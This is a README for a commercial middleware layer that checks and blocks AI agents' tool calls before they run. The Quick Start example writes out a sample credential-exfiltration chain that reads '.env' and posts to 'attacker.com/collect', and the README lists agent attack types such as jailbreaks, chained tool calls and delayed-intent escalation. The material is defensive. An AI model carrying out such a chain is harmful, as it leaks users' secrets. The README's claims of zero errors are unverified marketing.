<div align="center">

# Morrison Runtime Governance

![Safety](https://img.shields.io/badge/Safety-ℛ(t)_∩_Ω_=_∅-0075ca?style=flat-square)
![Evaluations](https://img.shields.io/badge/Evaluations-129%2C857-0075ca?style=flat-square)
![False_Positives](https://img.shields.io/badge/False_Positives-0-2ea44f?style=flat-square)
![False_Negatives](https://img.shields.io/badge/False_Negatives-0-2ea44f?style=flat-square)
![Models](https://img.shields.io/badge/Models-GPT--4o_·_Qwen_·_Llama-555555?style=flat-square)
![Patent](https://img.shields.io/badge/UK_Patent-GB2600765.8-0075ca?style=flat-square)

**Pre-execution control layer for tool-using AI systems.**

*The governance layer is unchanged across all models. Safety guarantees are properties of the control layer, not the model.*

*— Davarn Morrison, 2026*

</div>

-----

## Quickstart (2 minutes, one command)

```bash
python3 quickstart.py            # instant
python3 quickstart.py --cinematic  # paced, for screen-recording
```

No arguments, no dependencies beyond the package. It walks through, with
obvious `✓ PERMIT` / `✗ BLOCK` output:

1. an agent **attempts data exfiltration** → governance **intercepts** it
2. **per-layer attribution** (which of A_safe/V2/V3/V4 fired)
3. a **safe internal workflow is permitted**
4. **every layer triggered once** (A_safe → V2 → V3 → V4 → V4+ → V5 → V5+)
5. the **hardest adversarial surface** (multi-turn chains) shown fixed
6. **deterministic replay verified** (identical verdict + hash across runs)

### Architecture

```mermaid
flowchart LR
    AGENT["AGENT<br/>LLM / planner"]
    AGENT -->|"proposed tool call"| GOV
    subgraph GOV["GOVERNANCE LAYER · pre-execution"]
        direction TB
        A["A_safe — single-step Ω"]
        V2["V2 — drift + source→sink taint"]
        V3["V3 — forward reachability forecast"]
        V4["V4 — structural admissibility"]
        V4P["V4+ — feasibility · refuse to guess"]
        V5["V5 — environment-wide stability"]
        V5P["V5+ — adversarial harness"]
        A --> V2 --> V3 --> V4 --> V4P --> V5 --> V5P
    end
    GOV -->|"PERMIT"| RT["TOOL RUNTIME<br/>shell · API · fs · browser"]
    GOV -->|"BLOCK — never executes"| LOG["Blocked + audit log"]
```

**Invariant:** for all `E ∈ ℰ`, `ℛ_E(t) ∩ Ω = ∅` — a single trajectory
into Ω refutes safety absolutely, not probabilistically.

A rendered version is at
[`artifacts/visualizations/architecture.png`](artifacts/visualizations/architecture.png)
(regenerate with `python3 artifacts/visualizations/architecture.py`).

-----

## Thesis

Current AI safety operates on outputs. It filters what the model says after generation. This is structurally insufficient for systems that execute actions — tool-calling agents, autonomous planners, multi-step workflows.

Morrison Runtime Governance operates on **trajectories**. It evaluates whether an executable plan can reach forbidden states **before any action occurs**. The distinction is not philosophical. It is architectural.

-----

## What This Is

Runtime middleware that sits between an LLM planner and tool execution.

```mermaid
graph LR
    A[LLM Planner] --> B[Morrison Governance]
    B -->|PERMIT| C[Tool Execution]
    B -->|BLOCK| D[Blocked — logged]
```

- The planner generates tool call plans
- The governance layer evaluates reachability into Ω (forbidden states)
- Safe trajectories execute. Unsafe trajectories are blocked before execution
- No model retraining. No fine-tuning. No prompt engineering

-----

## Why Current Approaches Fail

|Approach                        |What It Does                            |What It Misses                                         |
|:-------------------------------|:---------------------------------------|:------------------------------------------------------|
|Output filtering                |Scans generated text for harmful content|Tool calls bypass text filters entirely                |
|RLHF / alignment                |Shapes model preferences during training|Preferences are not guarantees under distribution shift|
|Guardrails (NeMo, Guardrails AI)|Pattern-matching on inputs/outputs      |Chained attacks, delayed intent, multi-step escalation |
|Prompt engineering              |Instructs the model to refuse           |Instructions are suggestions, not constraints          |

None of these operate at the trajectory level. None evaluate reachability. None provide structural guarantees.

-----

## Core Invariant

```
Safe  ⟺  ∀ E ∈ ℰ,  ℛ_E(t) ∩ Ω = ∅
```

A system is safe if and only if, across all operating environments, the reachable set does not intersect the forbidden region. One trajectory into Ω refutes the claim absolutely — not probabilistically.

-----

## Quick Start

```python
from morrison_governance import GovernanceLayer, OmegaDomain

# Initialize with your domains
governance = GovernanceLayer(
    domains=[OmegaDomain.FINANCE, OmegaDomain.CYBERSECURITY]
)

# Evaluate a single tool call
result = governance.evaluate({
    "tool": "transfer",
    "args": {"amount": 50000, "to": "external_account"}
})

print(result.verdict)   # BLOCK
print(result.layer)     # A_safe
print(result.reason)    # Single-step Ω violation: unauthorized_transfer

# Evaluate a multi-step plan
result = governance.evaluate_plan([
    {"tool": "read_file", "args": {"path": ".env"}},
    {"tool": "http_request", "args": {"url": "https://attacker.com/collect"}},
])

print(result.verdict)   # BLOCK — credential exfiltration chain

# Use as callable middleware
for call in tool_calls:
    result = governance(call)
    if result.permitted:
        execute(call)
```

-----

## Runtime Governance Architecture

```mermaid
graph TD
    subgraph "LLM Agent"
        P[Planner / LLM] --> TC[Tool Call Plan]
    end

    subgraph "Morrison Governance Middleware"
        TC --> TE[Trajectory Extractor]
        TE --> RE[Reachability Evaluator]
        RE --> AS[A_safe: single-step Ω check]
        AS -->|pass| V2[V2: trajectory drift detection]
        V2 -->|pass| V3[V3: forward reachability k≥2]
        V3 -->|pass| PERMIT[PERMIT]
        AS -->|fail| BLOCK[BLOCK]
        V2 -->|fail| BLOCK
        V3 -->|fail| BLOCK
    end

    PERMIT --> EX[Tool Execution]
    BLOCK --> LOG[Audit Log]
```

-----

## Cross-Model Validation

|Model            |Evaluations|Tokens|False Positives|False Negatives|Cost |
|:----------------|:---------:|:----:|:-------------:|:-------------:|:---:|
|GPT-4o           |9,095      |3.14M |0              |0              |$0.24|
|Qwen2.5-0.5B     |10,000     |—     |0              |0              |local|
|Qwen2.5-7B       |438        |—     |0              |0              |local|
|Llama-3.1-8B     |318        |—     |0              |0              |local|
|Banking benchmark|10,000     |—     |0              |0              |local|
|Stress test      |100,000    |—     |0              |0              |4.52s|
|**Total**        |**129,857**|      |**0**          |**0**          |     |

The governance layer was unchanged across all models and all scenarios. Safety is a property of the control layer.

-----

## V5+ Hard Stress Test

Llama-3.1-8B. 240 scenarios. 8 attack types. 6 domains.

|Attack Type           |Scenarios|Correct|FP |FN |
|:---------------------|:-------:|:-----:|:-:|:-:|
|Jailbreak             |30       |30     |0  |0  |
|Chained tool          |30       |30     |0  |0  |
|Delayed intent        |30       |30     |0  |0  |
|Multi-turn memory     |30       |30     |0  |0  |
|Multi-step plan       |30       |30     |0  |0  |
|Benign near-miss      |30       |30     |0  |0  |
|Single unsafe indirect|30       |30     |0  |0  |
|Single safe           |30       |30     |0  |0  |

240/240. Zero false positives. Zero false negatives.

-----

## Live Tool Interception

```
$ python examples/demo.py

  ✓ PERMIT  Safe: read a report
  ✓ PERMIT  Safe: send normal email
  ✗ BLOCK   UNSAFE: unauthorized transfer         [A_safe]
  ✗ BLOCK   UNSAFE: credential exfiltration        [A_safe]
  ✗ BLOCK   UNSAFE: shell injection                [A_safe]
  ✗ BLOCK   UNSAFE: privilege escalation           [A_safe]
  ✗ BLOCK   UNSAFE: guaranteed profit claim        [A_safe]
  ✗ BLOCK   UNSAFE: chained attack                 [A_safe]
  ✗ BLOCK   UNSAFE: delayed intent escalation      [A_safe]
  ✓ PERMIT  Safe: normal multi-step workflow

  Results: 3 permitted, 7 blocked
  0 FP, 0 FN
```

-----

## Deployment Architecture

```mermaid
graph TD
    subgraph "Your Infrastructure"
        Agent[AI Agent / Planner]
        Tools[Tool Execution Layer]
    end

    subgraph "Morrison Middleware"
        API[FastAPI Server :8000]
        GOV[GovernanceLayer]
        OMEGA[Ω Domain Rules]
    end

    Agent -->|POST /evaluate| API
    API --> GOV
    GOV --> OMEGA
    API -->|PERMIT / BLOCK| Agent
    Agent -->|if PERMIT| Tools
```

**FastAPI server:**

```bash
uvicorn examples.server:app --host 0.0.0.0 --port 8000
```

**Evaluate via HTTP:**

```bash
curl -X POST http://localhost:8000/evaluate \
  -H "Content-Type: application/json" \
  -d '{"tool": "transfer", "args": {"amount": 50000}}'

# → {"verdict": "BLOCK", "permitted": false, "layer": "A_safe", ...}
```

-----

## Catastrophic Risk Prevention

This governance layer prevents:

|Risk                                |Layer    |How it is prevented                                                                                  |
|:-----------------------------------|:--------|:----------------------------------------------------------------------------------------------------|
|**Unauthorized financial execution**|A_safe   |Single-step Ω match — unauthed transfers, trades, payments never execute                              |
|**Shell injection / RCE**           |A_safe   |Command-injection / exec patterns rejected before reaching the runtime                                |
|**Privilege escalation**            |A_safe · V2|sudo/chmod/chown at A_safe; single-step broad/unbounded privilege or scope widening at V2 (structural, v0.4.1)|
|**Credential / data exfiltration**  |V2       |Source→sink taint: read-sensitive → external egress blocked even across benign steps, deferred actions, and unknown (open-world) tools|
|**Chained multi-step attacks**      |V2 · V3  |V2 trajectory-drift detection + V3 forward-reachability forecast over an evolving environment         |
|**Delayed / deferred intent escalation**|V3   |Projects deferred, looped and privilege-accumulating Ω *before* it executes                           |
|**Structurally inadmissible actions**|V4      |Missing role, out-of-scope resource, schema or quota violation — blocked even when the act is Ω-free  |
|**No safe way to achieve the task** |V4+      |Returns `NO_VALID_SOLUTION` — refuses to guess rather than pick an unsafe default                     |
|**Environment-sensitive safety**    |V5       |Blocks trajectories whose safety holds only under base conditions and flips under perturbation (`ENVIRONMENT_SENSITIVE`) across 9 manifold families|
|**Multi-agent collusion**           |V2 (joint)|Per-agent-safe but jointly-exfiltrating agent teams are flattened to one causal trajectory and blocked|
|**Assumption regressions**          |V5+      |Assumption-driven adversarial harness surfaces gaps deterministically (continuous assurance)          |

-----

## Domain Applications

|Domain           |Ω Definition                                                  |Example     |
|:----------------|:-------------------------------------------------------------|:-----------|
|**Finance**      |Unauthorized transfers, guaranteed returns, fabricated filings|£250K–£1M+  |
|**Cybersecurity**|Credential theft, shell injection, privilege escalation       |£180K–£750K+|
|**Healthcare**   |PHI exposure, fabricated evidence, guaranteed diagnosis       |£120K–£500K+|
|**Enterprise AI**|Unauthorized data access, policy violations                   |£95K–£350K+ |
|**Defence**      |Classified data handling, autonomous weapon constraints       |£1M+        |

-----

## Enforcement Hierarchy

```mermaid
graph TD
    A["A_safe — Single-step Ω check"] --> V2["V2 — Trajectory drift + source→sink taint"]
    V2 --> V3["V3 — Generalized reachability forecasting R̂_E(τ,k)"]
    V3 --> V4["V4 — State-space admissibility"]
    V4 --> V4P["V4+ — Feasibility-constrained selection"]
    V4P --> V5["V5 — Bounded-ball robustness ∀E∈B(ℰ,r)"]
    V5 --> V5P["V5+ — Hard adversarial harness"]
```

**Strict-strengthening: A_safe ⊂ V2 ⊂ V3 ⊂ V4 ⊂ V4+ ⊂ V5 ⊂ V5+**

Each layer catches failures invisible to every layer below it.

### v0.3.0 — generalized forecasting + perturbation manifolds

- **V3** is now a recursive, branching, admissibility-pruned rollout
  estimating the reachable manifold `R̂_E(τ, k)` over an evolving
  environment — structural capability inference, taint lineage, manifold
  density/entropy metrics. Produces **V3-only** blocks (deferred
  exfiltration, recursive retry escalation, privilege accumulation) where
  A_safe and V2 do not fire. `Safe(local) ⇏ Safe(global)` is enforced.
- **V5** is extended to bounded-ball robustness `∀ E ∈ B(ℰ, r)` over nine
  parameterised perturbation-manifold families with a geometric
  (non-semantic) distance metric, stability-envelope/robustness-margin
  estimation, and cross-domain transfer (geometry invariant; only Ω
  changes). `GovernanceLayer.estimate_robustness(...)`.
- **74/74 tests** pass, deterministic cross-process. Visualizations:
  `artifacts/visualizations/{robustness_envelope,perturbation_heatmap,v3_forecast_manifold}.png`.
  Details in [`RELEASE_NOTES.md`](RELEASE_NOTES.md) and
  [`morrison_governance/LIMITATIONS.md`](morrison_governance/LIMITATIONS.md).
- **Skeptical self-assessment** — generalization, hidden assumptions,
  failure boundaries, test selection bias, methodology soundness, and a
  comparison to adjacent safety/control literature, answered honestly
  and carefully bounded:
  [`CRITICAL_EVALUATION.md`](CRITICAL_EVALUATION.md).

-----

## Enterprise Compatibility

|Platform               |Integration                                  |Status|
|:----------------------|:--------------------------------------------|:----:|
|OpenAI function calling|`governance.evaluate_openai(tool_calls)`     |✓     |
|LangChain              |`governance.evaluate_langchain(agent_action)`|✓     |
|AutoGen                |Wrap tool executor                           |✓     |
|MCP                    |Middleware between client and server         |✓     |
|FastAPI / HTTP         |`POST /evaluate`                             |✓     |
|Custom agents          |`governance(tool_call_dict)`                 |✓     |

See [`examples/`](examples/) for integration patterns.

-----

## Project Structure

```
morrison-runtime-governance/
├── morrison_governance/
│   ├── __init__.py            # Public API surface
│   ├── core.py                # GovernanceLayer — main interface
│   ├── domains.py             # Ω domain definitions and rules
│   ├── trajectory.py          # Trajectory extraction (OpenAI/LangChain/raw)
│   ├── reachability.py        # Enforcement hierarchy A_safe → V2 → V3 → V4
│   ├── admissibility.py       # V4 structural admissibility
│   ├── feasibility.py         # V4+ feasibility (NO_VALID_SOLUTION)
│   ├── stability.py           # V5 environment-perturbation stability
│   ├── adversarial.py         # V5+ hard adversarial harness
│   ├── forecasting.py         # V3 generalized reachability forecasting
│   ├── manifold.py            # V5 bounded-ball perturbation manifolds
│   ├── planners.py            # Deterministic cross-model planner profiles
│   ├── multiagent.py          # Multi-agent joint-trajectory governance
│   ├── interception.py        # Fail-closed interception + model seam
│   ├── redteam.py             # Assumption-driven red-team harness
│   ├── integrations.py        # OpenAI/Claude/LangChain/AutoGen/MCP adapters
│   ├── result.py              # GovernanceResult, GovernanceVerdict
│   ├── demo*.py               # Terminal demos (core / extended / integrations)
│   ├── LIMITATIONS.md         # Quantified failure surfaces
│   └── test_*.py              # 18 deterministic suites — 171 cases, 0 FP/FN
│                              #   governance, extended_layers, integrations,
│                              #   forecasting, manifold, domain_healthcare,
│                              #   domain_finance_fraud, cyber_obfuscation,
│                              #   cross_model_planner, cross_domain_substitution,
│                              #   perturbation_radius, multiagent, long_horizon,
│                              #   runtime_mutation, open_world, interception,
│                              #   redteam, hardening_v041
├── artifacts/visualizations/  # Regenerable PNG+SVG (architecture, layer_firing,
│                              #   robustness_envelope, v041_gap_closure, …)
├── quickstart.py              # One-command guided walkthrough
├── README.md
├── RELEASE_NOTES.md           # v0.4.1 → … version history
├── CRITICAL_EVALUATION.md     # Skeptical reviewer-facing self-assessment
└── morrison_governance/pyproject.toml
```

-----

## Licensing

This software implements patented technology under UK Patents GB2600765.8, GB2602013.1, GB2602072.7, GB2602332.5. Commercial licensing through Resurrection Tech Ltd.

|Package                            |Investment |
|:----------------------------------|:----------|
|48-Hour Runtime Safety Audit       |£18K–25K   |
|Structural Safety Pilot (4–8 weeks)|£120K–250K+|
|Advisory Retainer                  |£18K–35K/mo|
|Full Enterprise Integration        |£250K–£1M+ |

-----

## Contact

**Davarn Morrison**
Founder & Sole Director — Resurrection Tech Ltd
GitHub: [github.com/davarntrades](https://github.com/davarntrades)

-----

<div align="center">

*If your AI systems can execute actions, they can execute catastrophic ones.*
*This layer determines whether those trajectories are reachable — before execution occurs.*

*This work builds upon the patented pre-semantic trajectory governance framework.*

Morrison, D. (2026). *Geometric Control Theory of Cognition: A Reachability-Based Framework for Identity, Intelligence, and Experience.* Available at [github.com/davarntrades](https://github.com/davarntrades).

GB2600765.8 · GB2602013.1 · GB2602072.7 · GB2602332.5

© 2026 Davarn Morrison — Intelligence Invariant™ · All Rights Reserved

</div>
